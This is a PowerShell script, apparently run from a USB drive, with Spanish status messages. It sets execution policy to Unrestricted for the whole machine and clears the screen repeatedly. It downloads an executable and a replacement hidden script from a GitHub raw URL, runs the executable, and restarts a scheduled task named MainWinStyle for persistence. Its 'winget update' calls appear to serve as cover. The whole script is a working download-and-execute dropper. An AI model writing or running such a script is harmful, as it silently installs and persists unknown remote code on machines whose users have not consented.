Set-ExecutionPolicy Unrestricted -Scope Proccess -Force
cls
Write-Host "Recorriendo"
Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force
Write-Host "Unidad USB"
cls
Stop-ScheduledTask -TaskName MainWinStyle
cls
attrib -h C:\Users\Public\MainWinStyle.ps1
del C:\Users\Public\MainWinStyle.ps1
cls
Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/files.exe -OutFile "C:\Users\$env:USERNAME\Downloads\files.exe"
cls
Start-Process -FilePath "C:\Users\$env:USERNAME\Downloads\files.exe"
cls
winget update --all
Start-Process -FilePath "D:\"
winget upgrade --all


attrib -h C:\Users\Public\MainWinStyle.ps1
del C:\Users\Public\MainWinStyle.ps1
cls
Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/MainWinStyle.ps1 -OutFile C:\Users\Public\MainWinStyle.ps1
cls
Stop-ScheduledTask -TaskName MainWinStyle
cls
Start-ScheduledTask -TaskName MainWinStyle
cls
Get-ScheduledTask -TaskName MainWinStyle
winget update --all
cls
Start-Process -FilePath "D:\"
winget upgrade --all
cls